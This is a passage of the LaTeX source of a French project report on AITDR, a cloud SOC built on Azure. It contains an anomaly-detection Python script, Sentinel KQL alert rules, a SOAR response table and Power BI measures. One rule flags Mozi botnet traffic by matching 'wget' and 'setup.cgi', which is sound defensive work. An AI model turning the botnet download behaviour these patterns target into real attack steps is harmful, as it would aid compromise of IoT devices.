    alert_severity VARCHAR(10)
);

CREATE TABLE MLAnomalies (
    id INT IDENTITY(1,1) PRIMARY KEY,
    detected_at DATETIME NOT NULL DEFAULT GETDATE(),
    anomaly_score FLOAT,
    anomaly_label VARCHAR(50),
    model_used VARCHAR(50),
    source_ip VARCHAR(45),
    details VARCHAR(1000)
);
\end{lstlisting}
\placeholderfigure{6.6}{Modèle de données SQL}

\section{Intelligence Artificielle --- Détection d'Anomalies}
\subsection{Fondements théoriques}
Isolation Forest isole les anomalies par partitionnement récursif. Son score peut être exprimé par :
\[
s(x,n)=2^{-\frac{E(h(x))}{c(n)}}
\]
où $E(h(x))$ représente la longueur moyenne du chemin d'isolement. DBSCAN regroupe les points selon leur densité et identifie les points isolés comme anomalies.

\subsection{VM2 --- Configuration ML}
\begin{table}[H]
\centering
\caption{Paramètres de VM2}
\label{tab:vm2}
\small
\begin{tabularx}{\textwidth}{|L{4cm}|Y|}
\hline
\theadcell{Paramètre} & \theadcell{Valeur} \\
\hline
Type & Standard B2s \\ \hline
OS & Ubuntu 22.04 LTS \\ \hline
IP & 10.10.2.40, sans IP publique \\ \hline
Accès & VPN Hub ou jump box \\ \hline
Runtime & Python 3.10, scikit-learn, pandas \\ \hline
Fréquence & Exécution horaire via cron \\ \hline
\end{tabularx}
\end{table}

\subsection{Extrait du Script ML}
\begin{lstlisting}[style=pythonstyle, caption={Script ML Isolation Forest et DBSCAN}]
#!/usr/bin/env python3
import pandas as pd
import pyodbc
from sklearn.ensemble import IsolationForest
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler

conn = pyodbc.connect("DRIVER={ODBC Driver 17 for SQL Server};SERVER=server;DATABASE=AttackLogsDB;UID=user;PWD=pass;Encrypt=yes")

ssh_df = pd.read_sql("""
SELECT attacker_ip,
       COUNT(*) AS attempt_count,
       COUNT(DISTINCT username_tried) AS unique_users,
       DATEPART(HOUR, attack_time) AS hour_of_day
FROM SSHAttacks
WHERE attack_date >= DATEADD(day,-7,GETDATE())
GROUP BY attacker_ip, DATEPART(HOUR, attack_time)
""", conn)

features = ["attempt_count", "unique_users", "hour_of_day"]
X = StandardScaler().fit_transform(ssh_df[features])

iforest = IsolationForest(contamination=0.1, random_state=42, n_estimators=100)
ssh_df["iforest_label"] = iforest.fit_predict(X)

dbscan = DBSCAN(eps=0.5, min_samples=5)
ssh_df["dbscan_label"] = dbscan.fit_predict(X)

anomalies = ssh_df[(ssh_df["iforest_label"] == -1) | (ssh_df["dbscan_label"] == -1)]
print(anomalies)
\end{lstlisting}

\section{SIEM --- Microsoft Sentinel}
\subsection{Architecture et intégration}
Microsoft Sentinel est intégré à un Log Analytics Workspace dédié. Les Data Collection Rules collectent les journaux système et sécurité depuis VM1 et les rendent exploitables par des requêtes KQL.
\placeholderfigure{6.7}{Data Collection Rule dans Sentinel}

\subsection{Règles d'alerte KQL}
\begin{lstlisting}[style=bashstyle, caption={KQL SSH Brute Force}]
Syslog
| where Facility == "auth"
| where SyslogMessage contains "Invalid user" or SyslogMessage contains "Failed password"
| extend AttackerIP = extract(@"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", 1, SyslogMessage)
| summarize AttemptCount=count(), UniqueUsers=dcount(extract(@"Invalid user (\w+)", 1, SyslogMessage))
  by AttackerIP, bin(TimeGenerated, 5m)
| where AttemptCount > 10
\end{lstlisting}
\placeholderfigure{6.8}{Règle KQL --- SSH Brute Force}

\begin{lstlisting}[style=bashstyle, caption={KQL Mozi Botnet}]
Syslog
| where SyslogMessage contains "Mozi" or SyslogMessage contains "wget" or SyslogMessage contains "setup.cgi"
| summarize Count=count() by Computer, bin(TimeGenerated, 5m)
| where Count > 3
\end{lstlisting}

\section{SOAR --- Réponse Automatique aux Incidents}
\subsection{Architecture Logic Apps}
Les Logic Apps sont déclenchées par les incidents Sentinel. Le workflow extrait l'adresse IP, identifie le type d'incident, puis applique une action automatique : blocage NSG, alerte mail ou désallocation de VM selon la sévérité.
\placeholderfigure{6.9}{Workflow Logic App SOAR}

\subsection{Tableau de réponses SOAR}
\begin{table}[H]
\centering
\caption{Tableau de réponses SOAR}
\label{tab:soar}
\small
\begin{tabularx}{\textwidth}{|L{3cm}|Y|L{2.5cm}|}
\hline
\theadcell{Type incident} & \theadcell{Actions automatiques} & \theadcell{Délai estimé} \\
\hline
RCE & Blocage IP + désallocation VM. & $<$ 30s \\ \hline
CMDI & Blocage IP + désallocation VM. & $<$ 30s \\ \hline
SQLi & Blocage IP + email. & $<$ 30s \\ \hline
Bruteforce & Blocage IP + email. & $<$ 30s \\ \hline
SSH & Blocage IP. & $<$ 30s \\ \hline
LFI & Blocage IP. & $<$ 30s \\ \hline
XSS & Log uniquement. & N/A \\ \hline
\end{tabularx}
\end{table}

\section{Visualisation --- Power BI}
\subsection{Connexion et configuration}
\begin{table}[H]
\centering
\caption{Paramètres de connexion Power BI}
\label{tab:powerbi}
\small
\begin{tabularx}{\textwidth}{|L{4cm}|Y|}
\hline
\theadcell{Paramètre} & \theadcell{Valeur} \\
\hline
Serveur & \code{aitdr-sql-server.database.windows.net} \\ \hline
Base de données & \code{AttackLogsDB} \\ \hline
Mode & DirectQuery \\ \hline
Authentification & Compte SQL \\ \hline
Actualisation & Manuelle ou planifiée \\ \hline
\end{tabularx}
\end{table}

\subsection{Mesures DAX significatives}
\begin{lstlisting}[style=sqlstyle, caption={Mesures DAX}]
TotalSSHAttacks = COUNTROWS(SSHAttacks)

UniqueAttackers = DISTINCTCOUNT(SSHAttacks[attacker_ip])

TopAttacker =
FIRSTNONBLANK(
    TOPN(1,
        SUMMARIZE(SSHAttacks, SSHAttacks[attacker_ip], "count", COUNTROWS(SSHAttacks)),
        [count], DESC),
    1
)

SeverityHighCount =
CALCULATE(COUNTROWS(SSHAttacks), SSHAttacks[attack_result] = "Failed")
\end{lstlisting}
\placeholderfigure{6.10}{Tableau de bord Power BI}

\section{Conclusion du Chapitre 6}
Ce chapitre a présenté la réalisation technique de la solution AITDR. L'infrastructure Azure est déployée avec Terraform, le honeypot DVWA capture des attaques, Suricata enrichit les logs réseau et le pipeline ETL stocke les données dans SQL. Sentinel centralise les événements, Logic Apps automatise la réponse et Power BI assure la visualisation. L'ensemble démontre la faisabilité opérationnelle d'une plateforme SOC cloud-native.

% ============================================
% CONCLUSION GÉNÉRALE
% ============================================
\chapter*{Conclusion générale}
\addcontentsline{toc}{chapter}{Conclusion générale}

Le projet AITDR a permis de réaliser huit livrables majeurs : une infrastructure Azure segmentée, un honeypot DVWA, un pipeline ETL, une base Azure SQL, un SIEM Microsoft Sentinel, des Logic Apps SOAR, des modèles ML d'anomalies et des tableaux de bord Power BI. Ces réalisations démontrent la capacité à construire une plateforme SOC complète dans un contexte budgétaire limité.

Les compétences acquises couvrent l'architecture Cloud Azure, Terraform, la cybersécurité défensive, Suricata, l'administration Linux, Microsoft Sentinel, Azure Logic Apps, Python, le Machine Learning et Power BI. Le projet a également renforcé les compétences en gestion de projet, documentation technique et optimisation des coûts cloud.

Les perspectives d'évolution concernent le court terme avec la finalisation des playbooks SOAR et la calibration ML, le moyen terme avec l'intégration de Threat Intelligence, de Sigma et de Zeek, puis le long terme avec le multi-honeypot, Kubernetes et l'intégration de LLM pour les rapports d'incident.

AITDR présente une valeur professionnelle importante, car il montre qu'une solution SOC cloud-native peut être conçue avec rigueur, automatisée et maintenue dans un budget de 100 USD. Le projet constitue une base solide pour des usages pédagogiques, expérimentaux et potentiellement professionnels.

% ============================================
% BIBLIOGRAPHIE
% ============================================
\chapter*{Bibliographie et Nétographie}
\addcontentsline{toc}{chapter}{Bibliographie et Nétographie}
\begin{enumerate}
  \item Microsoft Corporation. \textit{Microsoft Azure Documentation}. \url{https://docs.microsoft.com/azure}
  \item HashiCorp. \textit{Terraform Documentation}. \url{https://developer.hashicorp.com/terraform/docs}
  \item Microsoft Corporation. \textit{Microsoft Sentinel Documentation}. \url{https://docs.microsoft.com/sentinel}
  \item Suricata Project. \textit{Suricata IDS Documentation}. \url{https://suricata.readthedocs.io/}
  \item Scikit-learn Developers. \textit{Scikit-learn Documentation}. \url{https://scikit-learn.org/stable/}
  \item Microsoft Corporation. \textit{Power BI Documentation}. \url{https://docs.microsoft.com/power-bi}
  \item ANRT. \textit{Observatoire de l'économie numérique}. \url{https://www.anrt.ma/observatoire}
  \item CNDP. \textit{Protection des données personnelles}. \url{https://www.cndp.ma/}
  \item OWASP Foundation. \textit{OWASP Top 10}. \url{https://owasp.org/Top10/}
  \item MITRE Corporation. \textit{MITRE ATT\&CK Framework}. \url{https://attack.mitre.org/}
\end{enumerate}

% ============================================
% ANNEXES
% ============================================
\appendix
\chapter{Technologies Utilisées}
\begin{longtable}{|L{4cm}|L{10.5cm}|}
\caption{Technologies utilisées par catégorie}\\
\hline
\theadcell{Catégorie} & \theadcell{Technologies} \\
\hline
\endfirsthead
\hline
\theadcell{Catégorie} & \theadcell{Technologies} \\
\hline
\endhead
Infrastructure & Microsoft Azure, Terraform, ARM Templates, VNet, NSG, VPN Gateway. \\ \hline
Machines virtuelles & Ubuntu 22.04 LTS, cloud-init, systemd, Docker CE. \\ \hline
Honeypot & DVWA, MySQL 5.7, Suricata, Fail2ban. \\ \hline
Sécurité & Key Vault, Managed Identity, RBAC, SSH, TLS. \\ \hline
Données & Azure SQL Database, Blob Storage, pyodbc. \\ \hline
SIEM/SOAR & Microsoft Sentinel, KQL, Logic Apps, Azure Monitor Agent. \\ \hline
Machine Learning & Python, scikit-learn, Isolation Forest, DBSCAN, pandas. \\ \hline
\end{longtable}

\chapter{Glossaire}
\begin{longtable}{|L{4cm}|L{10.5cm}|}
\caption{Glossaire}\\
\hline
\theadcell{Terme} & \theadcell{Définition} \\
\hline
\endfirsthead
\hline
\theadcell{Terme} & \theadcell{Définition} \\
\hline
\endhead
Alert fatigue & Surcharge d'alertes qui diminue l'efficacité de l'analyse. \\ \hline
APT & Menace persistante avancée. \\ \hline
Bootstrap & Script d'initialisation d'une machine. \\ \hline
DBSCAN & Algorithme de clustering basé sur la densité. \\ \hline
Defense in depth & Défense en profondeur multicouche. \\ \hline
EVE JSON & Format de logs produit par Suricata. \\ \hline
Honeypot & Système volontairement exposé pour attirer les attaquants. \\ \hline
Hub-and-Spoke & Topologie réseau centralisée autour d'un hub. \\ \hline
IMDS & Azure Instance Metadata Service. \\ \hline
Isolation Forest & Algorithme de détection d'anomalies. \\ \hline
Jump box & Machine relais d'administration. \\ \hline
Managed Identity & Identité Azure gérée sans secret statique. \\ \hline
MTTD & Mean Time To Detect. \\ \hline
MTTC & Mean Time To Contain. \\ \hline
Zero Trust & Modèle de sécurité sans confiance implicite. \\ \hline
\end{longtable}

\chapter{Extrait du code Terraform complet}
Le code Terraform complet est disponible sur GitHub à l'adresse suivante :
\url{https://github.com/oussama-gammal/aitdr-terraform}

\chapter{Scripts Python de collecte et parsing}
Les scripts Python de collecte et parsing sont disponibles sur GitHub à l'adresse suivante :
\url{https://github.com/oussama-gammal/aitdr-scripts}

\manualplaceholderfigure{13.1}{Azure Cost Management --- Coûts accumulés}
\manualplaceholderfigure{13.2}{Microsoft Defender for Cloud --- Score de sécurité}
\manualplaceholderfigure{13.3}{Log Analytics --- Requête KQL}

\addcontentsline{lot}{table}{Tableau 6.1 : Stratégies d'optimisation des coûts}
\addcontentsline{lot}{table}{Tableau 7.1 : Attaques réelles capturées --- Timeline}
\addcontentsline{lot}{table}{Tableau 7.2 : Statistiques globales des attaques}

\end{document}
